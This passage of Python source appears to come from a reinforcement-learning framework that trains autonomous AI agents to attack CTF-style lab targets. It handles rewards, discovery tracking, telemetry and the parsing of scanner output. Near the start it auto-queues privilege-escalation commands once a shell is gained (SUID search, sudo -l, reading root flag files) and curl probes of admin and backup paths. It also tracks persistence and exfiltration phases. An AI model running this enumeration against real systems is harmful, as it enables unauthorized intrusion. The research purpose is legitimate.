                    # Phase 7.1: Mark the service/port as exploited
                    # Extract port/service from command to mark as exploited
                    _cmd_lower = (getattr(result.decision, "command", "") or "").lower()
                    for _p in self.discovery_board["ports"]:
                        if str(_p) in _cmd_lower:
                            self.discovery_board["exploited_ports"].add(int(_p))
                    for _svc in self.discovery_board["services"]:
                        if str(_svc).lower().split("/")[0] in _cmd_lower:
                            self.discovery_board["exploited_services"].add(_svc)
                    
                    # HTB: Auto-queue critical privesc enumeration commands
                    # when a shell is obtained. These run on the target via SSH auto-wrap.
                    if not self.discovery_board.get("_privesc_enum_queued"):
                        self.discovery_board["_privesc_enum_queued"] = True
                        _privesc_cmds = [
                            {"command": "getcap -r / 2>/dev/null",
                             "description": "Find binaries with Linux capabilities (cap_setuid, etc.)"},
                            {"command": "sudo -l 2>/dev/null",
                             "description": "Check sudo permissions for current user"},
                            {"command": "find / -perm -4000 -type f 2>/dev/null | head -30",
                             "description": "Find SUID binaries for privilege escalation"},
                            {"command": "cat /home/*/user.txt 2>/dev/null || cat /root/root.txt 2>/dev/null",
                             "description": "Read CTF flags if accessible"},
                        ]
                        for pcmd in _privesc_cmds:
                            self.followup_queue.append({
                                "command": pcmd["command"],
                                "source": "privesc_enum",
                                "priority": 95,
                                "description": pcmd["description"],
                                "service": "ssh",
                                "ttl": 20,
                            })
                        logger.warning(
                            f"[PRIVESC-ENUM] Shell obtained — queued {len(_privesc_cmds)} "
                            f"privesc enumeration commands"
                        )
                if agent_discoveries.get("vulnerability"):
                    self.discovery_board["vulns"].add("found")
                for path in agent_discoveries.get("web_path", []):
                    _path_str = str(path).strip("/").strip()
                    # Phase 23: Sanitize web paths — reject IPs, domains, empty, single-char
                    # Phase 24: Also reject version-number-like paths (3.6, 1.18.0, etc.)
                    # Phase 35: Reject local filesystem paths and tool artifacts
                    _LOCAL_PATH_PREFIXES = (
                        "usr/", "etc/", "var/", "tmp/", "home/", "opt/",
                        "proc/", "sys/", "dev/", "root/", "lib/", "bin/",
                        "sbin/", "run/", "mnt/", "media/", "boot/",
                    )
                    _TOOL_ARTIFACT_NAMES = (
                        "common.txt", "big.txt", "directory-list",
                        "wordlist", "rockyou", "seclists",
                    )
                    if (not _path_str
                        or _path_str == "."
                        or _path_str == ".."
                        or len(_path_str) < 2
                        or re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', _path_str)
                        or re.match(r'^\d+(\.\d+)+$', _path_str)  # version numbers like 3.6, 1.18.0
                        or re.match(r'^\d+$', _path_str)  # bare numbers
                        or _path_str.startswith("http")
                        or any(_path_str.startswith(pfx) for pfx in _LOCAL_PATH_PREFIXES)
                        or any(art in _path_str.lower() for art in _TOOL_ARTIFACT_NAMES)
                        or "/" in _path_str and len(_path_str.split("/")) > 3  # deep paths are local
                        or _path_str in ("index.html", "index.php", "#", "#about", "#testimonials")):
                        logger.debug(f"[WEB_PATH_DISC] Rejected invalid path: '{_path_str}'")
                        continue
                    self.discovery_board["web_paths"].add(_path_str)
                    logger.debug(
                        f"[WEB_PATH_DISC] Added '{path}' to discovery_board.web_paths "
                        f"from {result.agent_name}. Board now: {self.discovery_board['web_paths']}"
                    )
                # Set web_paths_discovered flag when any web paths found
                if self.discovery_board.get("web_paths"):
                    self.discovery_board["flags_set"].add("web_paths_discovered")

                    # Phase 40: Auto-queue probes for interesting web paths
                    try:
                        from core.feature_flags import get_feature_flags as _p40_awp
                        if getattr(_p40_awp(), 'auto_web_probe', False):
                            _HIGH_VALUE_PATHS = {
                                "/download", "/data", "/capture", "/backup",
                                "/upload", "/admin", "/api", "/config",
                                "/secret", "/private", "/files", "/export",
                            }
                            _web_paths_set = self.discovery_board.get("web_paths", set())
                            for wp in list(_web_paths_set)[-5:]:
                                wp_lower = str(wp).lower().rstrip("/")
                                if wp_lower in _HIGH_VALUE_PATHS:
                                    _probe_key = f"_auto_probed_{wp_lower}"
                                    if not ctx.state_flags.get(_probe_key):
                                        ctx.set_state_flag(_probe_key)
                                        if not hasattr(self, '_auto_probe_queue'):
                                            self._auto_probe_queue = []
                                        self._auto_probe_queue.append(
                                            f"curl -sL http://{ctx.target}{wp_lower}"
                                        )
                                        logger.info(
                                            f"[P40-AUTO-PROBE] Queued probe for {wp_lower}"
                                        )
                    except Exception:
                        pass

                self.discovery_board["phase"] = ctx.current_phase.name
                self.discovery_board["flags_set"] = set(
                    k for k, v in ctx.state_flags.items() if v
                )
            
            # Determine success based on output quality
            # Commands that produce meaningful output are considered successful
            # Phase 6.4: Detect tool-not-found and error outputs as failures
            _out_lower = (output_to_parse or "").lower().strip()
            _is_tool_failure = any(marker in _out_lower for marker in [
                "not found", "command not found", "no such file",
                "permission denied", "connection refused", "connection timed out",
                "network is unreachable", "name or service not known",
            ])
            sim_success = bool(
                output_to_parse
                and not output_to_parse.startswith("[SIM]")
                and len(output_to_parse) > 20
                and not _is_tool_failure
            )
            
            # Phase 5.2 + R67: Cross-agent discovery deduplication
            # R67: Use SharedDiscoverySet for structured dedup with metrics
            deduped_discoveries = {}
            if agent_discoveries:
                for disc_type, disc_values in agent_discoveries.items():
                    if isinstance(disc_values, list):
                        new_vals = []
                        for v in disc_values:
                            key = f"{disc_type}:{v}"
                            # R67: Try SharedDiscoverySet first, fall back to old set
                            _is_new = False
                            if hasattr(self, 'shared_discovery') and self.shared_discovery is not None:
                                _is_new = self.shared_discovery.claim(key, agent=result.agent_name)
                            else:
                                _is_new = key not in self._episode_shared_discoveries
                            if _is_new:
                                self._episode_shared_discoveries.add(key)
                                new_vals.append(v)
                        if new_vals:
                            deduped_discoveries[disc_type] = new_vals
                    elif isinstance(disc_values, bool) and disc_values:
                        key = f"{disc_type}:found"
                        _is_new = False
                        if hasattr(self, 'shared_discovery') and self.shared_discovery is not None:
                            _is_new = self.shared_discovery.claim(key, agent=result.agent_name)
                        else:
                            _is_new = key not in self._episode_shared_discoveries
                        if _is_new:
                            self._episode_shared_discoveries.add(key)
                            deduped_discoveries[disc_type] = disc_values
                    else:
                        key = f"{disc_type}:{disc_values}"
                        _is_new = False
                        if hasattr(self, 'shared_discovery') and self.shared_discovery is not None:
                            _is_new = self.shared_discovery.claim(key, agent=result.agent_name)
                        else:
                            _is_new = key not in self._episode_shared_discoveries
                        if _is_new:
                            self._episode_shared_discoveries.add(key)
                            deduped_discoveries[disc_type] = disc_values
            
            # Record result with DEDUPED discoveries (for ALL agents, not just RedAgent)
            if result.agent_name in self.coaches:
                breakdown = self.coaches[result.agent_name].record_result(
                    decision=result.decision,
                    success=sim_success or env_reward >= 0,
                    raw_output=output_to_parse,
                    new_discoveries=deduped_discoveries,
                    done=done,  # Phase 4: pass done for PPO trajectory
                    shared_discoveries=self._episode_shared_discoveries,  # Phase 6: cross-agent dedup
                )
                result.reward_breakdown = breakdown
                # Accumulate smart rewards from all agents
                if breakdown:
                    smart_reward_total += breakdown.total
                
                # Phase 0.1: Update stagnation counter
                if agent_discoveries:
                    self._steps_without_discoveries[result.agent_name] = 0  # Reset on discovery
                else:
                    self._steps_without_discoveries[result.agent_name] = (
                        self._steps_without_discoveries.get(result.agent_name, 0) + 1
                    )
                
                # ─── Phase 8: JSONL decision telemetry ──────────────
                if self.decision_logger is not None:
                    try:
                        from core.tracing.jsonl_logger import DecisionLogEntry
                        _coach = self.coaches.get(result.agent_name)
                        _cog_telem = None  # CognitionNode removed (Phase 12.1)
                        
                        log_entry = DecisionLogEntry(
                            episode=self.current_episode,
                            step=step,
                            agent=result.agent_name,
                            phase=(
                                self.attack_context.current_phase.name
                                if self.attack_context else "RECON"
                            ),
                            command=result.decision.command[:120] if result.decision.command else "",
                            template_name=result.decision.template_name or "",
                            source=result.decision.source or "unknown",
                            confidence=result.decision.confidence,
                            reward_total=breakdown.total if breakdown else 0.0,
                            reward_discovery=breakdown.discovery_bonus if breakdown else 0.0,
                            reward_progress=breakdown.progress_bonus if breakdown else 0.0,
                            reward_novelty=breakdown.novelty_bonus if breakdown else 0.0,
                            reward_redundancy=breakdown.redundancy_penalty if breakdown else 0.0,
                            success=sim_success or env_reward >= 0,
                            cognition_brain=(
                                _cog_telem.get("winning_brain") if _cog_telem else None
                            ),
                            cognition_confidence=(
                                _cog_telem.get("confidence") if _cog_telem else None
                            ),
                            rnd_bonus=(
                                _cog_telem.get("rnd_bonus", 0.0) if _cog_telem else 0.0
                            ),
                            macro_intent=(
                                _cog_telem.get("macro_intent") if _cog_telem else None
                            ),
                        )
                        self.decision_logger.log_decision(log_entry)
                    except Exception:
                        pass  # Never let logging break training
                
                # ─── Phase 9: CognitiveBus action recording ─────────
                if self.cognitive_bus:
                    try:
                        self.cognitive_bus.record_action(
                            agent_id=result.agent_name,
                            command=result.decision.command or "",
                            source=result.decision.source or "unknown",
                            reward=breakdown.total if breakdown else 0.0,
                            discoveries=deduped_discoveries or {},
                            output_summary=(result.decision.command_output or "")[:200],
                        )
                    except Exception:
                        pass  # Never let bus break training
                
                # ─── Phase 9.4: Cortex step recording ────────────────
                # Record step outcomes in TacticalCortex and ExecutiveCortex
                # for future assessments and plan tracking.
                _had_disc = bool(deduped_discoveries)
                _step_phase = (
                    self.attack_context.current_phase.name
                    if self.attack_context else "RECON"
                )
                _step_template = result.decision.template_name or ""
                
                if self.tactical_cortex is not None:
                    try:
                        self.tactical_cortex.record_step(
                            command=result.decision.command or "",
                            template_name=_step_template,
                            had_discovery=_had_disc,
                            step=step,
                        )
                    except Exception:
                        pass
                
                if self.executive_cortex is not None:
                    try:
                        self.executive_cortex.record_step(
                            phase=_step_phase,
                            template_name=_step_template,
                            had_discovery=_had_disc,
                            discovery_board=self.discovery_board,
                        )
                    except Exception:
                        pass
                
                # ─── Phase 9.7: Emit StepEvent telemetry ─────────────
                if self._telemetry_logger is not None:
                    try:
                        from core.telemetry.events import StepEvent, AntiRepeatRecord
                        _ar = AntiRepeatRecord(
                            triggered=(result.decision.source == "anti_repeat"),
                            count=getattr(result.decision, 'anti_repeat_count', 0),
                            action="replace" if result.decision.source == "anti_repeat" else "none",
                        )
                        _disc_list = []
                        if deduped_discoveries:
                            for dk, dv in deduped_discoveries.items():
                                if isinstance(dv, list):
                                    for item in dv:
                                        _disc_list.append({"type": dk, "value": str(item)})
                                elif isinstance(dv, bool) and dv:
                                    _disc_list.append({"type": dk, "value": "true"})
                        _rb = {}
                        if breakdown:
                            _rb = {
                                "total": round(breakdown.total, 2),
                                "progress": round(breakdown.progress_bonus, 2),
                                "discovery": round(breakdown.discovery_bonus, 2),
                                "novelty": round(breakdown.novelty_bonus, 2),
                                "redundancy": round(breakdown.redundancy_penalty, 2),
                            }
                        _ddqn_sel = 0
                        _ddqn_cached = 0
                        _ddqn_eps = 0.0
                        _coach = self.coaches.get(result.agent_name)
                        if _coach and hasattr(_coach, 'ddqn_macro') and _coach.ddqn_macro:
                            _ddqn_sel = getattr(_coach.ddqn_macro, '_select_call_count', 0)
                            _ddqn_cached = getattr(_coach.ddqn_macro, '_cached_call_count', 0)
                            _ddqn_eps = getattr(_coach.ddqn_macro, 'epsilon', 0.0)
                        step_ev = StepEvent(
                            run_id=self.run_id or "",
                            episode_id=self.current_episode,
                            agent=result.agent_name,
                            step=step,
                            phase=_step_phase,
                            selected_template=result.decision.template_name or "",
                            selected_command=(result.decision.command or "")[:200],
                            source=result.decision.source or "unknown",
                            confidence=result.decision.confidence,
                            discoveries=_disc_list,
                            discovery_count=len(_disc_list),
                            reward_breakdown=_rb,
                            reward_total=breakdown.total if breakdown else 0.0,
                            anti_repeat=_ar,
                            ddqn_select_calls=_ddqn_sel,
                            ddqn_cached_calls=_ddqn_cached,
                            ddqn_epsilon=_ddqn_eps,
                        )
                        self._telemetry_logger.log_step(step_ev)
                    except Exception:
                        pass  # Never let telemetry break training
        
        # ─── PHASE 8.2 Batch 16: Re-evaluate deferred discoveries ───
        # If post-shell gate is now satisfied, apply previously suppressed
        # persistence/exfil discoveries so phase can advance to CLOSEOUT.
        if self._deferred_discoveries and self._shell_obtained_step is not None and self.attack_context:
            _steps_since_shell = step - self._shell_obtained_step
            _min_explore = 2 if self._shell_obtained_step >= 28 else self.POST_SHELL_EXPLORE_STEPS
            if _steps_since_shell >= _min_explore:
                ctx = self.attack_context
                _applied = []
                for disc_type, agent_name, orig_step in self._deferred_discoveries:
                    if disc_type == "persistence" and not ctx.state_flags.get("persistence_established"):
                        ctx.set_state_flag("persistence_established")
                        logger.info(f"[PHASE-ADVANCE] persistence_established set (deferred from s{orig_step} {agent_name})")
                        _applied.append(disc_type)
                    elif disc_type == "data_exfiltrated" and not ctx.state_flags.get("data_exfiltrated"):
                        ctx.set_state_flag("data_exfiltrated")
                        logger.info(f"[PHASE-ADVANCE] data_exfiltrated set (deferred from s{orig_step} {agent_name})")
                        _applied.append(disc_type)
                if _applied:
                    self._deferred_discoveries.clear()
                    logger.info(f"[DEFERRED-DISCOVERY] Applied deferred: {_applied} at step {step}")
        
        # Use smart reward if available, otherwise fall back to env reward
        final_reward = smart_reward_total if smart_reward_total != 0 else env_reward
        
        # ─── PHASE 6.3: Watchdog check per step ─────────────────────
        if self.watchdog:
            for result in agent_results:
                from core.training.watchdog import StepSnapshot, extract_command_family
                snapshot = StepSnapshot(
                    step_num=step,
                    phase=self.attack_context.current_phase.name if self.attack_context else "RECON",
                    agent_name=result.agent_name,
                    command=result.decision.command,
                    command_family=extract_command_family(result.decision.command),
                    discoveries=self._parse_output_for_discoveries(
                        result.decision.command_output or "", command=result.decision.command or "",
                        episode_id=self._current_episode_id,
                        step_idx=step, agent_id=result.agent_name,
                    ),
                    is_live_mode=self._is_live_mode,
                    target_ip=self.config.default_target,
                )
                verdict = self.watchdog.check(snapshot)
                if verdict.should_intervene:
                    # Emit watchdog event
                    if hasattr(self, 'event_bus'):
                        self.event_bus.publish_generic(
                            EventKind.WARNING,
                            message=f"[WATCHDOG] {verdict.message}",
                            data={"trigger": verdict.trigger.value if verdict.trigger else "",
                                  "heal": verdict.heal_action.value,
                                  "agent": result.agent_name},
                            episode_id=episode_id,
                            step_num=step,
                        )
                    if verdict.abort_episode:
                        done = True
                        self.episode_termination_reason = TerminationReason.STUCK_ABORT
                        logger.warning(f"[WATCHDOG] Aborting episode: {verdict.message}")
        
        # Phase 6.5: _display_step_results removed — unified dashboard handles all display
        
        # ─── PHASE 4: PPO trajectory now collected per-coach in SmartCoach ──
        # The old global PPO trajectory collection was disconnected:
        # PPO.select_action() returned a different action than SmartCoach chose,
        # creating incoherent training signal. Now each SmartCoach has its own
        # PPOAgent and records trajectory in record_result().
        # (Global PPO kept for backward compat but no longer collects trajectory)
        
        # Log traces
        for result in agent_results:
            self._log_step_trace(
                episode_id=episode_id,
                step=step,
                result=result,
                global_reward=final_reward,
                done=done,
            )
        
        # Phase 9: Inter-agent reasoning — share significant discoveries across CognitiveBus
        try:
            if hasattr(self, 'cognitive_bus') and self.cognitive_bus and agent_results:
                for result in agent_results:
                    # Share high-value findings with all other agents
                    if result.reward_breakdown and result.reward_breakdown.total > 10.0:
                        self.cognitive_bus.record_inter_agent_message(
                            from_agent=result.agent_name,
                            to_agent="all",
                            message_type="high_value_action",
                            content=(
                                f"High-value action: {result.decision.command[:60]} "
                                f"(reward={result.reward_breakdown.total:.1f}, "
                                f"source={result.decision.source})"
                            ),
                        )
        except Exception:
            pass

        # ─── Phase 39: OpsHub on_step_end + subsystem hooks ─────────
        _current_phase_p39 = (
            self.attack_context.current_phase.name
            if self.attack_context else "RECON"
        )
        if self.ops_hub is not None:
            try:
                _step_data: Dict[str, Any] = {
                    "phase": _current_phase_p39,
                    "reward": final_reward,
                    "done": done,
                    "agent_count": len(agent_results),
                }
                self.ops_hub.on_step_end(
                    step,
                    phase=_step_data.get("phase", ""),
                    discoveries=len(agent_results),
                )
            except Exception as _e:
                logger.debug(f"[P39] OpsHub on_step_end error: {_e}")

        # ─── Phase 39.1: Orion Rethink — record step + stall check ──
        if self.orion_rethink is not None:
            try:
                _disc_count = sum(
                    len(v) if isinstance(v, (set, list)) else (1 if v else 0)
                    for v in self.discovery_board.values()
                    if not isinstance(v, str)
                )
                _red_cmd = ""
                _red_success = False
                for r in agent_results:
                    if r.agent_name == "RedAgent":
                        _red_cmd = r.decision.command or ""
                        _red_success = bool(
                            r.reward_breakdown and r.reward_breakdown.total > 0
                        )
                        break
                self.orion_rethink.record_step(
                    step=step,
                    phase=_current_phase_p39,
                    command=_red_cmd,
                    success=_red_success,
                    discoveries=_disc_count,
                    reward=final_reward,
                )
                # Check rethink trigger
                _should, _stall = self.orion_rethink.should_rethink(step)
                if _should:
                    _plan = self.orion_rethink.generate_rethink_plan(
                        evidence_summary=dict(self.discovery_board),
                        hypotheses=[],
                        constraints=[],
                        current_phase=_current_phase_p39,
                        current_step=step,
                        gpt_manager=None,  # heuristic mode
                    )
                    if _plan is not None:
                        _plan_desc = str(_plan.plan)[:100] if _plan.plan else _plan.why_now[:100]
                        logger.info(
                            f"[P39.1] Orion rethink triggered at step {step}: "
                            f"stall_score={_stall.score:.2f}, "
                            f"plan={_plan_desc}"
                        )
                        # Log to debug tracer
                        if self.debug_tracer is not None:
                            self.debug_tracer.log_rethink(
                                step=step,
                                stall_score=_stall.score,
                                plan_summary={
                                    "why_now": _plan.why_now[:200],
                                    "hypotheses": _plan.new_hypotheses[:3],
                                    "signals": {
                                        "tool_failures": _stall.repeated_tool_failures,
                                        "evidence_plateau": _stall.evidence_plateau,
                                        "phase_oscillation": _stall.phase_oscillation,
                                        "reward_stagnation": _stall.reward_stagnation,
                                    },
                                },
                                episode=self.current_episode,
                                phase=_current_phase_p39,
                            )
            except Exception as _e:
                logger.debug(f"[P39.1] Orion rethink error: {_e}")

        # ─── Phase 39.2: Trust engine — record decision outcomes ─────
        if self.trust_engine is not None:
            try:
                self.trust_engine.set_global_step(step)
                for r in agent_results:
                    _src = r.decision.source or "registry"
                    _reward = (
                        r.reward_breakdown.total
                        if r.reward_breakdown else 0.0
                    )
                    if _reward > 2.0:
                        self.trust_engine.record_validated(_src, step=step)
                    elif _reward < -2.0:
                        self.trust_engine.record_failed(_src, step=step)
                    # Log trust update
                    if self.debug_tracer is not None:
                        self.debug_tracer.log_trust_update(
                            step=step,
                            source=_src,
                            trust=self.trust_engine.get_trust(_src),
                            delta=_reward,
                            episode=self.current_episode,
                        )
            except Exception as _e:
                logger.debug(f"[P39.2] Trust engine error: {_e}")

        # ─── Phase 39.4: Debug tracer — log step decision ────────────
        if self.debug_tracer is not None:
            try:
                for r in agent_results:
                    self.debug_tracer.log_decision(
                        step=step,
                        agent=r.agent_name,
                        command=(r.decision.command or "")[:80],
                        source=r.decision.source or "unknown",
                        confidence=r.decision.confidence,
                        episode=self.current_episode,
                        phase=_current_phase_p39,
                        extra={
                            "reward": (
                                r.reward_breakdown.total
                                if r.reward_breakdown else 0.0
                            ),
                        },
                    )
            except Exception as _e:
                logger.debug(f"[P39.4] Debug tracer error: {_e}")
        
        return agent_results, final_reward, new_state, done
    
    def _update_context_from_state(self, state: Dict[str, Any]):
        """Update attack context from environment state."""
        if not self.attack_context:
            return
        
        ctx = self.attack_context
        
        # Update from state dict
        if isinstance(state, dict):
            # Open ports
            if "open_ports" in state:
                for port in state["open_ports"]:
                    if f"open_port:{port}" not in ctx.discoveries:
                        ctx.add_discovery("open_port", port)
            
            # Services
            if "services" in state:
                for svc in state["services"]:
                    if isinstance(svc, dict):
                        ctx.add_service(svc.get("name", ""), svc.get("port"))
                    else:
                        ctx.add_service(str(svc))
            
            # Platform detection
            if "os" in state and ctx.platform == "unknown":
                os_str = state["os"].lower()
                if "windows" in os_str:
                    ctx.platform = "windows"
                elif "linux" in os_str or "unix" in os_str:
                    ctx.platform = "linux"
            
            # Update last command
            if "last_command" in state:
                ctx.command_history.append(state["last_command"])
    
    def _parse_output_for_discoveries(
        self, output: str, command: str = "",
        episode_id: int = 0, step_idx: int = 0, agent_id: str = "",
    ) -> Dict[str, Any]:
        """Parse command output for new discoveries - rewards good simulated actions.

        Phase 5: Expanded with subdomain, dns_record, web_parameter,
        api_endpoint, version_info discovery types for deeper reward signal.
        Phase 7.3: Added command-aware filtering to prevent false discoveries
        from non-scanner commands (searchsploit, msfvenom, msfconsole search).
        Phase 9.4: SmartOutputParser (regex + nano-LLM) is tried first.
        Falls back to inline regex if SmartOutputParser is unavailable or
        returns no results.
        Phase 9.5: StepParseCache dedup — if the same output was already parsed
        this step, returns cached result (avoids triple nano-LLM cost).
        """
        discoveries = {}
        
        if not output or (output.startswith("[SIM]") and len(output) < 30):
            return discoveries
        
        # Strip ANSI escape codes (ffuf/feroxbuster/gobuster emit [2K, [0m, etc.)
        import re as _re
        output = _re.sub(r'\x1b\[[0-9;]*[a-zA-Z]', '', output)
        
        # ── Phase 9.5: Check parse cache before parsing ──────────────
        if self._parse_cache is not None and agent_id:
            try:
                from core.feature_flags import get_feature_flags
                if get_feature_flags().single_parse_cache:
                    cached = self._parse_cache.get(episode_id, step_idx, agent_id, output)
                    if cached is not None:
                        return cached
            except ImportError:
                pass
        
        # ── Phase 9.4: SmartOutputParser two-stage pipeline ──────────
        # Try the structured parser first (OutputParser regex + LLM fallback).
        # If it finds discoveries, use them as the base — but ALWAYS run
        # the web-path regex below to catch ffuf/gobuster/feroxbuster results
        # that the SmartOutputParser doesn't handle.
        smart_result = None
        if self.smart_parser is not None:
            try:
                smart_result = self.smart_parser.parse(
                    command=command,
                    output=output,
                    agent_name="orchestrator",
                )
                if smart_result:
                    logger.debug(
                        f"[SMART-PARSER] Found {len(smart_result)} discovery types "
                        f"for '{command[:40]}'"
                    )
                    discoveries = smart_result  # Use as base, web-path check runs below
            except Exception as e:
                logger.debug(f"[SMART-PARSER] Error: {e}")
        
        # ── Fallback: inline regex parsing (original logic) ──────────
        
        # Phase 5.2: Reject outputs dominated by error messages
        output_lines = output.strip().split('\n')
        error_lines = sum(1 for line in output_lines 
                         if any(e in line.lower() for e in ['error', 'failed', 'denied', 'refused', 'timeout', 'not found']))
        if len(output_lines) > 3 and error_lines / len(output_lines) > 0.7:
            return discoveries
        
        output_lower = output.lower()
        cmd_lower = command.lower() if command else ""
        
        # Phase 7.3: Commands that produce text with numbers but NOT actual port scans.
        # Their output contains exploit paths, module names, etc. that regex
        # incorrectly picks up as open ports.
        _NO_PORT_PARSE = ("searchsploit", "msfconsole", "msfvenom", "exploit-db",
                          "find /", "cat /etc", "uname ", "hashdump",
                          "nmap -sn", "nmap -sP", "nikto", "ping ",
                          "id ", "whoami", "hostname", "ifconfig",
                          "strings ", "file ", "xxd ")
        skip_port_parse = any(tag in cmd_lower for tag in _NO_PORT_PARSE)
        
        # Phase 35: If port parsing should be skipped, also remove any ports
        # that the SmartOutputParser may have extracted (LLM fallback can
        # hallucinate ports from IP addresses in host discovery output).
        if skip_port_parse and "open_port" in discoveries:
            logger.debug(
                f"[PORT-FILTER] Removed SmartOutputParser ports {discoveries['open_port']} "
                f"for non-port-scanning command: {command[:60]}"
            )
            del discoveries["open_port"]

        # Phase 8.2 Batch 14: Commands that produce REFERENCE TEXT about services,
        # exploits, and credentials — NOT actual discoveries from scanning the target.
        # msfconsole search lists modules containing "http", "ssh", "ftp", "sql injection",
        # "password", etc. in their names/descriptions.  Parser was falsely setting
        # http_service_found, credentials_known, sqli_confirmed, hash_known,
        # domain_admin_obtained from these module listings.
        _REFERENCE_COMMANDS = ("searchsploit", "msfconsole -q -x 'search",
                               "msfconsole -q -x \"search", "msfvenom",
                               "exploit-db", "apt ", "pip ",
                               "gpp-decrypt",  # Phase 39: GPP decrypt is never target discovery
                               )
        _is_reference = any(tag in cmd_lower for tag in _REFERENCE_COMMANDS)
        skip_discovery_parse = _is_reference
        
        # Phase 39 Fix-14: Reference commands can NEVER produce real target
        # discoveries.  Return empty immediately — SmartOutputParser regex/LLM
        # extracts CVEs, services, credentials, web_paths, etc. from exploit
        # TITLES and descriptions, inflating rewards by 30-50 per step.
        if _is_reference:
            logger.debug(
                f"[P39-REF-BLOCK] Blocked ALL discoveries for reference command: "
                f"{command[:60]}"
            )
            return {}
        
        # Phase 39: Exploit tool commands — these attempt real exploits
        # but produce massive noise in failure output ("Exploit completed",
        # "exploit/unix/...", banner text with service names).
        # Skip service/credential/vuln parsing, but KEEP shell detection active
        # so successful exploits are still detected.
        _EXPLOIT_TOOL_COMMANDS = (
            "msfconsole -q -x 'use",
            'msfconsole -q -x "use',
            "msfconsole -q -x 'exploit",
        )
        _skip_exploit_noise = any(tag in cmd_lower for tag in _EXPLOIT_TOOL_COMMANDS)
        if _skip_exploit_noise:
            skip_discovery_parse = True  # Skip service/cred/vuln/hash/lateral/domain_admin
        
        # Phase 39 Fix-14: Clean up SmartOutputParser false discoveries
        # SmartOutputParser runs BEFORE skip_discovery_parse is computed,
        # so its regex/LLM results may include false services, credentials,
        # vulnerabilities from exploit tool output.  For exploit tools, keep
        # ONLY shell/root_shell detection — strip everything else.
        if skip_discovery_parse and smart_result:
            _KEEP_FOR_EXPLOIT = {"shell", "root_shell"}
            _sp_removed = [k for k in list(discoveries.keys())
                           if k not in _KEEP_FOR_EXPLOIT]
            for k in _sp_removed:
                del discoveries[k]
            if _sp_removed:
                logger.debug(
                    f"[P39-SP-CLEAN] Stripped SmartOutputParser false discoveries "
                    f"{_sp_removed} for exploit command: {command[:60]}"
                )
        
        # HTB Fix: Detect local-only commands that don't target the remote host.
        # Commands like 'getcap -r /', 'find /usr -perm -4000', 'env', 'perl -e'
        # execute LOCALLY and their output falsely triggers shell/root_shell/
        # credential/vulnerability discoveries about the target.
        # Only commands containing the target IP or known network tools should
        # produce critical target discoveries.
        _target_ip = getattr(getattr(self, 'config', None), 'default_target', '') or ''
        _NETWORK_TOOLS = (
            "nmap", "curl", "wget", "hydra", "ssh", "sshpass", "ftp",
            "smbclient", "crackmapexec", "nikto", "gobuster", "ffuf",
            "feroxbuster", "nuclei", "sqlmap", "telnet", "nc ", "netcat",
            "rpcclient", "ldapsearch", "enum4linux", "whatweb", "wpscan",
            "dig ", "host ", "mysql", "psql", "redis-cli", "snmpwalk",
            "impacket", "evil-winrm", "bloodhound", "tshark", "strings ",
            "msfconsole", "commix", "tplmap",
        )
        _is_target_facing = (
            not command  # No command provided → assume target-facing
            or (_target_ip and _target_ip in command)
            or any(tool in cmd_lower for tool in _NETWORK_TOOLS)
        )
        # If command is purely local, suppress critical discoveries
        _skip_critical_discoveries = not _is_target_facing
        
        import re
        
        # Port discovery patterns (multiple formats)
        port_patterns = [
            r"(\d+)/(?:tcp|udp)\s+open",  # nmap format
            r"open port (\d+)/",           # masscan format
            r"Open \S+:(\d+)",             # rustscan format
            r"\[(\d+)\]\[",                # hydra format
            r"(?:\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|\*):(\d+)\s+\(",  # netstat/ss format (require IP:PORT or *:PORT)
            r"TCP open \S+:(\d+)",         # unicornscan format
        ]
        ports = set()
        if not skip_port_parse:
            for pattern in port_patterns:
                ports.update(re.findall(pattern, output_lower))
        if ports:
            # Phase 7.3: Filter to valid service port range only
            # Phase 24: Filter out false positives from version strings
            # Version strings like "8.9p1", "nginx/1.18.0", "5.0.51a", "3.0.20"
            # contain numbers that regex picks up as port numbers.
            # Reject ports that appear as version components.
            _VERSION_FALSE_POSITIVE_PATTERN = re.compile(
                r'(?:'
                r'[\w.-]+/\d+\.\d+(?:\.\d+)?'  # nginx/1.18.0
                r'|[\w]+\s+\d+\.\d+(?:\.\d+)?[a-z]*'  # OpenSSH 8.9p1
                r'|\d+\.\d+\.\d+[a-z]?'  # 5.0.51a
                r')',
                re.IGNORECASE,
            )
            _version_nums = set()
            for vm in _VERSION_FALSE_POSITIVE_PATTERN.finditer(output):
                # Extract all bare numbers from version strings
                for num in re.findall(r'(?<!\d)(\d{1,3})(?!\d)', vm.group()):
                    _version_nums.add(num)
            
            # Phase 35: Extract numbers from SSH/TLS fingerprints (hex:hex:...:NUM)
            # e.g. "64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)"
            # → "94" is NOT a port
            for _fp in re.findall(r'(?:[0-9a-f]{2}:){3,}([0-9a-f]{2})', output_lower):
                if _fp.isdigit():
                    _version_nums.add(_fp)
            
            # Phase 35: Extract numbers that appear as IP address octets
            # e.g. "10.129.1.94" → {10, 129, 1, 94} — these are NOT ports
            _ip_octets = set()
            for ip_match in re.findall(r'\b(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})\b', output):
                _ip_octets.update(ip_match)
            
            valid_ports = []
            for p in ports:
                if not p.isdigit():
                    continue
                pi = int(p)
                if pi < 1 or pi > 65535:
                    continue
                # If this number appears in nmap "X/tcp open" format, trust it
                # (these are always real ports)
                if re.search(rf'\b{p}/(?:tcp|udp)\s+open', output_lower):
                    valid_ports.append(pi)
                elif p in _version_nums and pi < 100:
                    # Small numbers from version strings are almost always false
                    continue
                elif p in _ip_octets and pi < 256:
                    # Number appears as an IP octet — likely false positive
                    logger.debug(f"[PORT-FILTER] Rejected port {pi} (IP octet false positive)")
                    continue
                else:
                    valid_ports.append(pi)
            discoveries["open_port"] = valid_ports
        
        # Service discovery (enhanced with version info)
        # NOTE: Word boundaries (\b) prevent false positives from group names
        # (e.g., "sambashare" in id output) and URLs containing "http"
        # Phase 8.2 Batch 10: Strip tool banner URLs before service detection
        # to prevent false http/https from nmap/hydra/enum4linux banners
        # Phase 8.2 Batch 14: Skip service parsing for reference commands
        if not skip_discovery_parse:
            _clean_output = re.sub(
                r'https?://\S+',  # Remove all URLs
                '', output_lower
            )
            _clean_output = re.sub(
                r'starting nmap.*?\n|hydra v[\d.]+.*?\n|enum4linux v[\d.]+.*?\n',
                '', _clean_output
            )
            # Phase 35: Strip exploit module paths to prevent false service detection
